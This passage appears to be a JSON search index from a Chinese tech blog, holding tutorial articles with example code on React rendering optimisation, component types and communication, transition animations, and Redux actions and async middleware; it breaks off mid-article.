就会导致render，父组件一旦发生render渲染，子组件一定也会执行render渲染\n从上面可以看到，父组件渲染导致子组件渲染，子组件并没有发生任何改变，这时候就可以从避免无谓的渲染，具体实现的方式有如下：\n\nshouldComponentUpdate\nPureComponent\nReact.memo\n\nshouldComponentUpdate通过shouldComponentUpdate生命周期函数来比对 state和 props，确定是否要重新渲染\n默认情况下返回true表示重新渲染，如果不希望组件重新渲染，返回 false 即可\nPureComponent跟shouldComponentUpdate原理基本一致，通过对 props 和 state的浅比较结果来实现 shouldComponentUpdate，源码大致如下：\nif (this._compositeType === CompositeTypes.PureClass) &#123;    shouldUpdate = !shallowEqual(prevProps, nextProps) || ! shallowEqual(inst.state, nextState);&#125;\n\nshallowEqual对应方法大致如下：\nconst hasOwnProperty = Object.prototype.hasOwnProperty;/** * is 方法来判断两个值是否是相等的值，为何这么写可以移步 MDN 的文档 * https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/is */function is(x: mixed, y: mixed): boolean &#123;  if (x === y) &#123;    return x !== 0 || y !== 0 || 1 / x === 1 / y;  &#125; else &#123;    return x !== x &amp;&amp; y !== y;  &#125;&#125;function shallowEqual(objA: mixed, objB: mixed): boolean &#123;  // 首先对基本类型进行比较  if (is(objA, objB)) &#123;    return true;  &#125;  if (typeof objA !== &#x27;object&#x27; || objA === null ||      typeof objB !== &#x27;object&#x27; || objB === null) &#123;    return false;  &#125;  const keysA = Object.keys(objA);  const keysB = Object.keys(objB);  // 长度不相等直接返回false  if (keysA.length !== keysB.length) &#123;    return false;  &#125;  // key相等的情况下，再去循环比较  for (let i = 0; i &lt; keysA.length; i++) &#123;    if (      !hasOwnProperty.call(objB, keysA[i]) ||      !is(objA[keysA[i]], objB[keysA[i]])    ) &#123;      return false;    &#125;  &#125;  return true;&#125;\n\n当对象包含复杂的数据结构时，对象深层的数据已改变却没有触发 render\n注意：在react中，是不建议使用深层次结构的数据\nReact.memoReact.memo用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似。但不同的是， React.memo 只能用于函数组件\nimport &#123; memo &#125; from &#x27;react&#x27;;function Button(props) &#123;  // Component code&#125;export default memo(Button);\n\n如果需要深层次比较，这时候可以给memo第二个参数传递比较函数\nfunction arePropsEqual(prevProps, nextProps) &#123;  // your code  return prevProps === nextProps;&#125;export default memo(Button, arePropsEqual);\n\n三、总结在实际开发过程中，前端性能问题是一个必须考虑的问题，随着业务的复杂，遇到性能问题的概率也在增高\n除此之外，建议将页面进行更小的颗粒化，如果一个过大，当状态发生修改的时候，就会导致整个大组件的渲染，而对组件进行拆分后，粒度变小了，也能够减少子组件不必要的渲染\n","categories":["框架"],"tags":["React"]},{"title":"React-类组件和函数组件的区别","url":"/2020/04/02/React/React-%E7%B1%BB%E7%BB%84%E4%BB%B6%E5%87%BD%E6%95%B0%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、类组件类组件，顾名思义，也就是通过使用ES6类的编写形式去编写组件，该类必须继承React.Component\n如果想要访问父组件传递过来的参数，可通过this.props的方式去访问\n在组件中必须实现render方法，在return中返回React对象，如下：\nclass Welcome extends React.Component &#123;  constructor(props) &#123;    super(props)  &#125;  render() &#123;    return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;  &#125;&#125;\n\n二、函数组件函数组件，顾名思义，就是通过函数编写的形式去实现一个React组件，是React中定义组件最简单的方式\nfunction Welcome(props) &#123;  return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;;&#125;\n\n函数第一个参数为props用于接收父组件传递过来的参数\n三、区别针对两种React组件，其区别主要分成以下几大方向：\n\n编写形式\n状态管理\n生命周期\n调用方式\n获取渲染的值\n\n编写形式两者最明显的区别在于编写形式的不同，同一种功能的实现可以分别对应类组件和函数组件的编写形式\n函数组件：\nfunction Welcome(props) &#123;  return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;;&#125;\n\n类组件：\nclass Welcome extends React.Component &#123;  constructor(props) &#123;    super(props)  &#125;  render() &#123;    return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;  &#125;&#125;\n\n状态管理在hooks出来之前，函数组件就是无状态组件，不能保管组件的状态，不像类组件中调用setState\n如果想要管理state状态，可以使用useState，如下：\nconst FunctionalComponent = () =&gt; &#123;    const [count, setCount] = React.useState(0);    return (        &lt;div&gt;            &lt;p&gt;count: &#123;count&#125;&lt;/p &gt;            &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;Click&lt;/button&gt;        &lt;/div&gt;    );&#125;;\n\n在使用hooks情况下，一般如果函数组件调用state，则需要创建一个类组件或者state提升到你的父组件中，然后通过props对象传递到子组件\n生命周期在函数组件中，并不存在生命周期，这是因为这些生命周期钩子都来自于继承的React.Component\n所以，如果用到生命周期，就只能使用类组件\n但是函数组件使用useEffect也能够完成替代生命周期的作用，这里给出一个简单的例子：\nconst FunctionalComponent = () =&gt; &#123;    useEffect(() =&gt; &#123;        console.log(&quot;Hello&quot;);    &#125;, []);    return &lt;h1&gt;Hello, World&lt;/h1&gt;;&#125;;\n\n上述简单的例子对应类组件中的componentDidMount生命周期\n如果在useEffect回调函数中return一个函数，则return函数会在组件卸载的时候执行，正如componentWillUnmount\nconst FunctionalComponent = () =&gt; &#123; React.useEffect(() =&gt; &#123;   return () =&gt; &#123;     console.log(&quot;Bye&quot;);   &#125;; &#125;, []); return &lt;h1&gt;Bye, World&lt;/h1&gt;;&#125;;\n\n调用方式如果是一个函数组件，调用则是执行函数即可：\n// 你的代码 function SayHi() &#123;     return &lt;p&gt;Hello, React&lt;/p &gt; &#125; // React内部 const result = SayHi(props) // » &lt;p&gt;Hello, React&lt;/p &gt;\n\n如果是一个类组件，则需要将组件进行实例化，然后调用实例对象的render方法：\n// 你的代码 class SayHi extends React.Component &#123;     render() &#123;         return &lt;p&gt;Hello, React&lt;/p &gt;     &#125; &#125; // React内部 const instance = new SayHi(props) // » SayHi &#123;&#125; const result = instance.render() // » &lt;p&gt;Hello, React&lt;/p &gt;\n\n获取渲染的值首先给出一个示例\n函数组件对应如下：\nfunction ProfilePage(props) &#123;  const showMessage = () =&gt; &#123;    alert(&#x27;Followed &#x27; + props.user);  &#125;  const handleClick = () =&gt; &#123;    setTimeout(showMessage, 3000);  &#125;  return (    &lt;button onClick=&#123;handleClick&#125;&gt;Follow&lt;/button&gt;  )&#125;\n\n类组件对应如下：\nclass ProfilePage extends React.Component &#123;  showMessage() &#123;    alert(&#x27;Followed &#x27; + this.props.user);  &#125;  handleClick() &#123;    setTimeout(this.showMessage.bind(this), 3000);  &#125;  render() &#123;    return &lt;button onClick=&#123;this.handleClick.bind(this)&#125;&gt;Follow&lt;/button&gt;  &#125;&#125;\n\n两者看起来实现功能是一致的，但是在类组件中，输出this.props.user，Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本\n因此，如果我们的组件在请求运行时更新。this.props 将会改变。showMessage方法从“最新”的 props 中读取 user\n而函数组件，本身就不存在this，props并不发生改变，因此同样是点击，alert的内容仍旧是之前的内容\n小结两种组件都有各自的优缺点\n函数组件语法更短、更简单，这使得它更容易开发、理解和测试\n而类组件也会因大量使用 this而让人感到困惑\n","categories":["框架"],"tags":["React"]},{"title":"React组件通信","url":"/2019/12/21/React/React-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","content":"一如何通信组件传递的方式有很多种，根据传送者和接收者可以分为如下：\n\n父组件向子组件传递\n子组件向父组件传递\n兄弟组件之间的通信\n父组件向后代组件传递\n非关系组件传递\n\n父组件向子组件传递由于React的数据流动为单向的，父组件向子组件传递是最常见的方式\n父组件在调用子组件的时候，只需要在子组件标签内传递参数，子组件通过props属性就能接收父组件传递过来的参数\nfunction EmailInput(props) &#123;  return (    &lt;label&gt;      Email: &lt;input value=&#123;props.email&#125; /&gt;    &lt;/label&gt;  );&#125;const element = &lt;EmailInput email=&quot;123124132@163.com&quot; /&gt;;\n\n子组件向父组件传递子组件向父组件通信的基本思路是，父组件向子组件传一个函数，然后通过这个函数的回调，拿到子组件传过来的值\n父组件对应代码如下：\nclass Parents extends Component &#123;  constructor() &#123;    super();    this.state = &#123;      price: 0    &#125;;  &#125;  getItemPrice(e) &#123;    this.setState(&#123;      price: e    &#125;);  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;div&gt;price: &#123;this.state.price&#125;&lt;/div&gt;        &#123;/* 向子组件中传入一个函数  */&#125;        &lt;Child getPrice=&#123;this.getItemPrice.bind(this)&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n子组件对应代码如下：\nclass Child extends Component &#123;  clickGoods(e) &#123;    // 在此函数中传入值    this.props.getPrice(e);  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.clickGoods.bind(this, 100)&#125;&gt;goods1&lt;/button&gt;        &lt;button onClick=&#123;this.clickGoods.bind(this, 1000)&#125;&gt;goods2&lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n兄弟组件之间的通信如果是兄弟组件之间的传递，则父组件作为中间层来实现数据的互通，通过使用父组件传递\nclass Parent extends React.Component &#123;  constructor(props) &#123;    super(props)    this.state = &#123;count: 0&#125;  &#125;  setCount = () =&gt; &#123;    this.setState(&#123;count: this.state.count + 1&#125;)  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;SiblingA          count=&#123;this.state.count&#125;        /&gt;        &lt;SiblingB          onClick=&#123;this.setCount&#125;        /&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n父组件向后代组件传递父组件向后代组件传递数据是一件最普通的事情，就像全局数据一样\n使用context提供了组件之间通讯的一种方式，可以共享数据，其他数据都能读取对应的数据\n通过使用React.createContext创建一个context\nconst PriceContext = React.createContext(&#x27;price&#x27;)\n\ncontext创建成功后，其下存在Provider组件用于创建数据源，Consumer组件用于接收数据，使用实例如下：\nProvider组件通过value属性用于给后代组件传递数据：\n&lt;PriceContext.Provider value=&#123;100&#125;&gt;&lt;/PriceContext.Provider&gt;\n\n如果想要获取Provider传递的数据，可以通过Consumer组件或者或者使用contextType属性接收，对应分别如下：\nclass MyClass extends React.Component &#123;  static contextType = PriceContext;  render() &#123;    let price = this.context;    /* 基于这个值进行渲染工作 */  &#125;&#125;\n\nConsumer组件：\n&lt;PriceContext.Consumer&gt;    &#123; /*这里是一个函数*/ &#125;    &#123;        price =&gt; &lt;div&gt;price：&#123;price&#125;&lt;/div&gt;    &#125;&lt;/PriceContext.Consumer&gt;\n\n非关系组件传递如果组件之间关系类型比较复杂的情况，建议将数据进行一个全局资源管理，从而实现通信，例如redux。关于redux的使用后续再详细介绍\n三、总结由于React是单向数据流，主要思想是组件不会改变接收的数据，只会监听数据的变化，当数据发生变化时它们会使用接收到的新值，而不是去修改已有的值\n因此，可以看到通信过程中，数据的存储位置都是存放在上级位置中\n","categories":["框架"],"tags":["React"]},{"title":"React-理解+特性","url":"/2020/04/05/React/React-%E7%90%86%E8%A7%A3+%E7%89%B9%E6%80%A7/","content":"一、是什么React，用于构建用户界面的 JavaScript 库，只提供了 UI 层面的解决方案\n遵循组件设计模式、声明式编程范式和函数式编程概念，以使前端应用程序更高效\n使用虚拟 DOM 来有效地操作 DOM，遵循从高阶组件到低阶组件的单向数据流\n帮助我们将界面成了各个独立的小块，每一个块就是组件，这些组件之间可以组合、嵌套，构成整体页面\nreact 类组件使用一个名为 render() 的方法或者函数组件return，接收输入的数据并返回需要展示的内容\nclass HelloMessage extends React.Component &#123;  render() &#123;    return &lt;div&gt;Hello &#123;this.props.name&#125;&lt;/div&gt;;  &#125;&#125;ReactDOM.render(  &lt;HelloMessage name=&quot;Taylor&quot; /&gt;,  document.getElementById(&quot;hello-example&quot;));\n\n上述这种类似 XML 形式就是 JSX，最终会被 babel 编译为合法的 JS 语句调用\n被传入的数据可在组件中通过 this.props 在 render() 访问\n二、特性React 特性有很多，如：\n\nJSX 语法\n单向数据绑定\n虚拟 DOM\n声明式编程\nComponent\n\n着重介绍下声明式编程及 Component\n声明式编程声明式编程是一种编程范式，它关注的是你要做什么，而不是如何做\n它表达逻辑而不显式地定义步骤。这意味着我们需要根据逻辑的计算来声明要显示的组件\n如实现一个标记的地图：\n通过命令式创建地图、创建标记、以及在地图上添加的标记的步骤如下：\n// 创建地图const map = new Map.map(document.getElementById(&quot;map&quot;), &#123;  zoom: 4,  center: &#123; lat, lng &#125;,&#125;);// 创建标记const marker = new Map.marker(&#123;  position: &#123; lat, lng &#125;,  title: &quot;Hello Marker&quot;,&#125;);// 地图上添加标记marker.setMap(map);\n\n而用 React 实现上述功能则如下：\n&lt;Map zoom=&#123;4&#125; center=&#123;(lat, lng)&#125;&gt;  &lt;Marker position=&#123;(lat, lng)&#125; title=&#123;&quot;Hello Marker&quot;&#125; /&gt;&lt;/Map&gt;\n\n声明式编程方式使得 React 组件很容易使用，最终的代码简单易于维护\nComponent在 React 中，一切皆为组件。通常将应用程序的整个逻辑分解为小的单个部分。 我们将每个单独的部分称为组件\n组件可以是一个函数或者是一个类，接受数据输入，处理它并返回在 UI 中呈现的 React 元素\n函数式组件如下：\nconst Header = () =&gt; &#123;  return (    &lt;Jumbotron style=&#123;&#123; backgroundColor: &quot;orange&quot; &#125;&#125;&gt;      &lt;h1&gt;TODO App&lt;/h1&gt;    &lt;/Jumbotron&gt;  );&#125;;\n\n类组件（有状态组件）如下：\nclass Dashboard extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;&#125;;  &#125;  render() &#123;    return (      &lt;div className=&quot;dashboard&quot;&gt;        &lt;ToDoForm /&gt;        &lt;ToDolist /&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n一个组件该有的特点如下：\n\n可组合：每个组件易于和其它组件一起使用，或者嵌套在另一个组件内部\n可重用：每个组件都是具有独立功能的，它可以被使用在多个 UI 场景\n可维护：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护\n\n三、优势通过上面的初步了解，可以感受到 React 存在的优势：\n\n高效灵活\n声明式的设计，简单使用\n组件式开发，提高代码复用率\n单向响应的数据流会比双向绑定的更安全，速度更快\n\n","categories":["框架"],"tags":["React"]},{"title":"React-构建组件的方式","url":"/2020/03/25/React/React-%E6%9E%84%E5%BB%BA%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/","content":"一、如何构建在React目前来讲，组件的创建主要分成了三种方式：\n\n函数式创建\n通过 React.createClass 方法创建\n继承 React.Component 创建\n\n函数式创建在React Hooks出来之前，函数式组件可以视为无状态组件，只负责根据传入的props来展示视图，不涉及对state状态的操作\n大多数组件可以写为无状态组件，通过简单组合构建其他组件\n在React中，通过函数简单创建组件的示例如下：\nfunction HelloComponent(props, /* context */) &#123;  return &lt;div&gt;Hello &#123;props.name&#125;&lt;/div&gt;&#125;\n\n通过 React.createClass 方法创建React.createClass是react刚开始推荐的创建组件的方式，目前这种创建方式已经不怎么用了\n像上述通过函数式创建的组件的方式，最终会通过babel转化成React.createClass这种形式，转化成如下：\nfunction HelloComponent(props) /* context */&#123;  return React.createElement(    &quot;div&quot;,    null,    &quot;Hello &quot;,    props.name  );&#125;\n\n由于上述的编写方式过于冗杂，目前基本上不使用上\n继承 React.Component 创建同样在react hooks出来之前，有状态的组件只能通过继承React.Component这种形式进行创建\n有状态的组件也就是组件内部存在维护的数据，在类创建的方式中通过this.state进行访问\n当调用this.setState修改组件的状态时，组价会再次会调用render()方法进行重新渲染\n通过继承React.Component创建一个时钟示例如下：\nclass Timer extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123; seconds: 0 &#125;;  &#125;  tick() &#123;    this.setState(state =&gt; (&#123;      seconds: state.seconds + 1    &#125;));  &#125;  componentDidMount() &#123;    this.interval = setInterval(() =&gt; this.tick(), 1000);  &#125;  componentWillUnmount() &#123;    clearInterval(this.interval);  &#125;  render() &#123;    return (      &lt;div&gt;        Seconds: &#123;this.state.seconds&#125;      &lt;/div&gt;    );  &#125;&#125;\n\n二、区别由于React.createClass创建的方式过于冗杂，并不建议使用\n而像函数式创建和类组件创建的区别主要在于需要创建的组件是否需要为有状态组件：\n\n对于一些无状态的组件创建，建议使用函数式创建的方式\n由于react hooks的出现，函数式组件创建的组件通过使用hooks方法也能使之成为有状态组件，再加上目前推崇函数式编程，所以这里建议都使用函数式的方式来创建组件\n\n在考虑组件的选择原则上，能用无状态组件则用无状态组件\n","categories":["框架"],"tags":["React"]},{"title":"React-过渡动画","url":"/2020/03/29/React/React-%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/","content":"一、是什么在日常开发中，页面切换时的转场动画是比较基础的一个场景\n当一个组件在显示与消失过程中存在过渡动画，可以很好的增加用户的体验\n在react中实现过渡动画效果会有很多种选择，如react-transition-group，react-motion，Animated，以及原生的CSS都能完成切换动画\n二、如何实现在react中，react-transition-group是一种很好的解决方案，其为元素添加enter，enter-active，exit，exit-active这一系列勾子\n可以帮助我们方便的实现组件的入场和离场动画\n其主要提供了三个主要的组件：\n\nCSSTransition：在前端开发中，结合 CSS 来完成过渡动画效果\nSwitchTransition：两个组件显示和隐藏切换时，使用该组件\nTransitionGroup：将多个动画组件包裹在其中，一般用于列表中元素的动画\n\nCSSTransition其实现动画的原理在于，当CSSTransition的in属性置为true时，CSSTransition首先会给其子组件加上xxx-enter、xxx-enter-active的class执行动画\n当动画执行结束后，会移除两个class，并且添加-enter-done的class\n所以可以利用这一点，通过css的transition属性，让元素在两个状态之间平滑过渡，从而得到相应的动画效果\n当in属性置为false时，CSSTransition会给子组件加上xxx-exit和xxx-exit-active的class，然后开始执行动画，当动画结束后，移除两个class，然后添加-enter-done的class\n如下例子：\nexport default class App2 extends React.PureComponent &#123;  state = &#123;show: true&#125;;  onToggle = () =&gt; this.setState(&#123;show: !this.state.show&#125;);  render() &#123;    const &#123;show&#125; = this.state;    return (      &lt;div className=&#123;&#x27;container&#x27;&#125;&gt;        &lt;div className=&#123;&#x27;square-wrapper&#x27;&#125;&gt;          &lt;CSSTransition            in=&#123;show&#125;            timeout=&#123;500&#125;            classNames=&#123;&#x27;fade&#x27;&#125;            unmountOnExit=&#123;true&#125;          &gt;            &lt;div className=&#123;&#x27;square&#x27;&#125; /&gt;          &lt;/CSSTransition&gt;        &lt;/div&gt;        &lt;Button onClick=&#123;this.onToggle&#125;&gt;toggle&lt;/Button&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n对应css样式如下：\n.fade-enter &#123;  opacity: 0;  transform: translateX(100%);&#125;.fade-enter-active &#123;  opacity: 1;  transform: translateX(0);  transition: all 500ms;&#125;.fade-exit &#123;  opacity: 1;  transform: translateX(0);&#125;.fade-exit-active &#123;  opacity: 0;  transform: translateX(-100%);  transition: all 500ms;&#125;\n\nSwitchTransitionSwitchTransition可以完成两个组件之间切换的炫酷动画\n比如有一个按钮需要在on和off之间切换，我们希望看到on先从左侧退出，off再从右侧进入\nSwitchTransition中主要有一个属性mode，对应两个值：\n\nin-out：表示新组件先进入，旧组件再移除；\nout-in：表示就组件先移除，新组建再进入\n\nSwitchTransition组件里面要有CSSTransition，不能直接包裹你想要切换的组件\n里面的CSSTransition组件不再像以前那样接受in属性来判断元素是何种状态，取而代之的是key属性\n下面给出一个按钮入场和出场的示例，如下：\nimport &#123; SwitchTransition, CSSTransition &#125; from &quot;react-transition-group&quot;;export default class SwitchAnimation extends PureComponent &#123;  constructor(props) &#123;    super(props);    this.state = &#123;      isOn: true    &#125;  &#125;  render() &#123;    const &#123;isOn&#125; = this.state;    return (      &lt;SwitchTransition mode=&quot;out-in&quot;&gt;        &lt;CSSTransition classNames=&quot;btn&quot;                       timeout=&#123;500&#125;                       key=&#123;isOn ? &quot;on&quot; : &quot;off&quot;&#125;&gt;          &#123;          &lt;button onClick=&#123;this.btnClick.bind(this)&#125;&gt;            &#123;isOn ? &quot;on&quot;: &quot;off&quot;&#125;          &lt;/button&gt;        &#125;        &lt;/CSSTransition&gt;      &lt;/SwitchTransition&gt;    )  &#125;  btnClick() &#123;    this.setState(&#123;isOn: !this.state.isOn&#125;)  &#125;&#125;\n\ncss文件对应如下：\n.btn-enter &#123;  transform: translate(100%, 0);  opacity: 0;&#125;.btn-enter-active &#123;  transform: translate(0, 0);  opacity: 1;  transition: all 500ms;&#125;.btn-exit &#123;  transform: translate(0, 0);  opacity: 1;&#125;.btn-exit-active &#123;  transform: translate(-100%, 0);  opacity: 0;  transition: all 500ms;&#125;\n\nTransitionGroup当有一组动画的时候，就可将这些CSSTransition放入到一个TransitionGroup中来完成动画\n同样CSSTransition里面没有in属性，用到了key属性\nTransitionGroup在感知children发生变化的时候，先保存移除的节点，当动画结束后才真正移除\n其处理方式如下：\n\n插入的节点，先渲染dom，然后再做动画\n删除的节点，先做动画，然后再删除dom\n\n如下：\nimport React, &#123; PureComponent &#125; from &#x27;react&#x27;import &#123; CSSTransition, TransitionGroup &#125; from &#x27;react-transition-group&#x27;;export default class GroupAnimation extends PureComponent &#123;  constructor(props) &#123;    super(props);    this.state = &#123;      friends: []    &#125;  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;TransitionGroup&gt;          &#123;            this.state.friends.map((item, index) =&gt; &#123;              return (                &lt;CSSTransition classNames=&quot;friend&quot; timeout=&#123;300&#125; key=&#123;index&#125;&gt;                  &lt;div&gt;&#123;item&#125;&lt;/div&gt;                &lt;/CSSTransition&gt;              )            &#125;)          &#125;        &lt;/TransitionGroup&gt;        &lt;button onClick=&#123;e =&gt; this.addFriend()&#125;&gt;+friend&lt;/button&gt;      &lt;/div&gt;    )  &#125;  addFriend() &#123;    this.setState(&#123;      friends: [...this.state.friends, &quot;coderwhy&quot;]    &#125;)  &#125;&#125;\n\n对应css如下：\n.friend-enter &#123;    transform: translate(100%, 0);    opacity: 0;&#125;.friend-enter-active &#123;    transform: translate(0, 0);    opacity: 1;    transition: all 500ms;&#125;.friend-exit &#123;    transform: translate(0, 0);    opacity: 1;&#125;.friend-exit-active &#123;    transform: translate(-100%, 0);    opacity: 0;    transition: all 500ms;&#125;","categories":["React"],"tags":["React"]},{"title":"Redux action+store+reducer","url":"/2019/10/30/React/Redux-action+store+reducer/","content":"\nredux的核心概念就是store、action、reducer，从调用关系来看如下所示\n\nstore.dispatch(action) --&gt; reducer(state, action) --&gt; final state// reducer方法, 传入的参数有两个// state: 当前的state// action: 当前触发的行为, &#123;type: &#x27;xx&#x27;&#125;// 返回值: 新的statevar reducer = function(state, action)&#123;    switch (action.type) &#123;        case &#x27;add_todo&#x27;:            return state.concat(action.text);        default:            return state;    &#125;&#125;;// 创建store, 传入两个参数// 参数1: reducer 用来修改state// 参数2(可选): [], 默认的state值,如果不传, 则为undefinedvar store = redux.createStore(reducer, []);// 通过 store.getState() 可以获取当前store的状态(state)// 默认的值是 createStore 传入的第二个参数console.log(&#x27;state is: &#x27; + store.getState());  // state is:// 通过 store.dispatch(action) 来达到修改 state 的目的// 注意: 在redux里,唯一能够修改state的方法,就是通过 store.dispatch(action)store.dispatch(&#123;type: &#x27;add_todo&#x27;, text: &#x27;读书&#x27;&#125;);// 打印出修改后的stateconsole.log(&#x27;state is: &#x27; + store.getState());  // state is: 读书store.dispatch(&#123;type: &#x27;add_todo&#x27;, text: &#x27;写作&#x27;&#125;);console.log(&#x27;state is: &#x27; + store.getState());  // state is: 读书,写作\n\n一、store、reducer、action关联store\n\nstore在这里代表的是数据模型，内部维护了一个state变量\nstore有两个核心方法，分别是getState、dispatch。前者用来获取store的状态（state），后者用来修改store的状态\n\n// 创建store, 传入两个参数// 参数1: reducer 用来修改state// 参数2(可选): [], 默认的state值,如果不传, 则为undefinedvar store = redux.createStore(reducer, []);// 通过 store.getState() 可以获取当前store的状态(state)// 默认的值是 createStore 传入的第二个参数console.log(&#x27;state is: &#x27; + store.getState());  // state is:// 通过 store.dispatch(action) 来达到修改 state 的目的// 注意: 在redux里,唯一能够修改state的方法,就是通过 store.dispatch(action)store.dispatch(&#123;type: &#x27;add_todo&#x27;, text: &#x27;读书&#x27;&#125;);\n\naction\n\n对行为（如用户行为）的抽象，在redux里是一个普通的js对象\naction必须有一个type字段来标识这个行为的类型\n\n&#123;type:&#x27;add_todo&#x27;, text:&#x27;读书&#x27;&#125;&#123;type:&#x27;add_todo&#x27;, text:&#x27;写作&#x27;&#125;&#123;type:&#x27;add_todo&#x27;, text:&#x27;睡觉&#x27;, time:&#x27;晚上&#x27;&#125;\n\nreducer\n\n一个普通的函数，用来修改store的状态。传入两个参数 state、action\n其中，state为当前的状态（可通过store.getState()获得），而action为当前触发的行为（通过store.dispatch(action)调用触发）\nreducer(state, action) 返回的值，就是store最新的state值\n\n// reducer方法, 传入的参数有两个// state: 当前的state// action: 当前触发的行为, &#123;type: &#x27;xx&#x27;&#125;// 返回值: 新的statevar reducer = function(state, action)&#123;    switch (action.type) &#123;        case &#x27;add_todo&#x27;:            return state.concat(action.text);        default:            return state;    &#125;&#125;;\n\n二、关于actionCreatoractionCreator(args) =&gt; actionvar addTodo = function(text)&#123;    return &#123;        type: &#x27;add_todo&#x27;,        text: text    &#125;;&#125;;addTodo(&#x27;睡觉&#x27;);  // 返回：&#123;type: &#x27;add_todo&#x27;, text: &#x27;睡觉&#x27;&#125;","categories":["框架"],"tags":["Redux"]},{"title":"Redux action异步","url":"/2020/04/23/React/Redux-action%E5%BC%82%E6%AD%A5/","content":"一、创建同步Action\nAction是数据从应用传递到 store&#x2F;state 的载体，也是开启一次完成数据流的开始\n\n普通的action对象\nconst action = &#123;\ttype:&#x27;ADD_TODO&#x27;,\tname:&#x27;poetries&#x27;&#125;dispatch(action)\n\n封装action creator\nfunction actionCreator(data)&#123;    return &#123;    \ttype:&#x27;ADD_TODO&#x27;,    \tdata:data    &#125;&#125;dispatch(actionCreator(&#x27;poetries&#x27;))\n\nbindActionCreators合并\nfunction a(name,id)&#123;\treurn &#123;\t\ttype:&#x27;a&#x27;,\t\tname,\t\tid\t&#125;&#125;function b(name,id)&#123;\treurn &#123;\t\ttype:&#x27;b&#x27;,\t\tname,\t\tid\t&#125;&#125;let actions = Redux.bindActionCreators(&#123;a,b&#125;,store.dispatch)//调用actions.a(&#x27;poetries&#x27;,&#x27;id001&#x27;)actions.b(&#x27;jing&#x27;,&#x27;id002&#x27;)\n\naction创建的标准\n\n在Flux的架构中，一个Action要符合 FSA(Flux Standard Action) 规范，需要满足如下条件\n\n\n是一个纯文本对象\n只具备 type 、payload、error 和 meta中的一个或者多个属性。type 字段不可缺省，其它字段可缺省\n若 Action 报错，error 字段不可缺省，切必须为 true\n\n\npayload 是一个对象，用作Action携带数据的载体\n\n标准action示例\n\nA basic Flux Standard Action:\n\n&#123;  type: &#x27;ADD_TODO&#x27;,  payload: &#123;    text: &#x27;Do something.&#x27;    &#125;&#125;\n\n\nAn FSA that represents an error, analogous to a rejected Promise\n\n&#123;  type: &#x27;ADD_TODO&#x27;,  payload: new Error(),  error: true&#125;\n\n\nhttps://github.com/acdlite/flux-standard-action\n\n\n可以采用如下一个简单的方式检验一个Action是否符合FSA标准\n\n// every有一个匹配不到返回falselet isFSA = Object.keys(action).every((item)=&gt;&#123;   return  [&#x27;payload&#x27;,&#x27;type&#x27;,&#x27;error&#x27;,&#x27;meta&#x27;].indexOf(item) &gt;  -1&#125;)\n\n二、创建异步action的多种方式\n最简单的方式就是使用同步的方式来异步，将原来同步时一个action拆分成多个异步的action的，在异步开始前、异步请求中、异步正常返回（异常）操作分别使用同步的操作，从而模拟出一个异步操作了。这样的方式是比较麻烦的，现在已经有redux-saga等插件来解决这些问题了\n\n异步action的实现方式一：setTimeout\n\nredux-thunk中间处理解析\n\nfunction thunkAction(data) &#123;    reutrn (dispatch)=&gt;&#123;        setTimeout(function()&#123;            dispatch(&#123;                type:&#x27;ADD_TODO&#x27;,                data            &#125;)        &#125;,3000)    &#125;&#125;\n\n异步action的实现方式二：promise实现异步action\n\nredux-promise`中间处理这种`action\n\nfunction promiseAction(name)&#123;    return new Promise((resolve,reject) =&gt; &#123;        setTimeout((param)=&gt;&#123;            resolve(&#123;                type:&#x27;ADD_TODO&#x27;,                name            &#125;)        &#125;,3000)    &#125;).then((param)=&gt;&#123;        dispatch(action(&quot;action2&quot;))        return;    &#125;).then((param)=&gt;&#123;        dispatch(action(&quot;action3&quot;))    &#125;)&#125;\n\n三、redux异步流程\n\n首先发起一个action，然后通过中间件，这里为什么要用中间件呢，因为这样dispatch的返回值才能是一个函数。\n通过store.dispatch，将状态的的改变传给store的小弟reducer，reducer根据action的改变，传递新的状态state。\n最后将所有的改变告诉给它的大哥，store。store保存着所有的数据，并将数据注入到组件的顶部，这样组件就可以获得它需要的数据了\n\n四、Redux异步方案选型redux-thunk\n\nRedux本身只能处理同步的Action，但可以通过中间件来拦截处理其它类型的action，比如函数(Thunk)，再用回调触发普通Action，从而实现异步处理\n\n\n发送异步的action其实是被中间件捕获的，函数类型的action就被middleware捕获。至于怎么定义异步的action要看你用哪个中间件，根据他们的实例来定义，这样才会正确解析action\n\n\nRedux 本身不处理异步行为，需要依赖中间件。结合 redux-actions 使用，Redux 有两个推荐的异步中间件\n\n\nredux-thunk\nredux-promise\n\n\nredux-thunk 的源码如下\n\nfunction createThunkMiddleware(extraArgument) &#123;  return (&#123; dispatch, getState &#125;) =&gt; next =&gt; action =&gt; &#123;    if (typeof action === &#x27;function&#x27;) &#123;      return action(dispatch, getState, extraArgument);    &#125;    return next(action);  &#125;;&#125;const thunk = createThunkMiddleware();thunk.withExtraArgument = createThunkMiddleware;export default thunk;\n\n\n源码可知，action creator 需要返回一个函数给 redux-thunk 进行调用，示例如下\n\nexport let 